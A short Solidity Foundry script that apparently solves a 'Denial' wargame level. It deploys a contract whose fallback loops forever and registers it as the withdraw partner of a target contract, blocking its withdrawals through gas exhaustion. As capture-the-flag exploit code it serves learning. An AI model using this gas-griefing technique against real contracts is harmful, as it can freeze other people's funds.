// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";

contract Ex {
    fallback() external payable {
        while (true) {}
    }
}

contract DenialSol is Script {
    Denial public den_ = Denial(payable(0x5c7A580EEE3627a66e3C4df5875a27401A47dCB6));

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();
        den_.setWithdrawPartner(address(ex));

        vm.stopBroadcast();
    }
}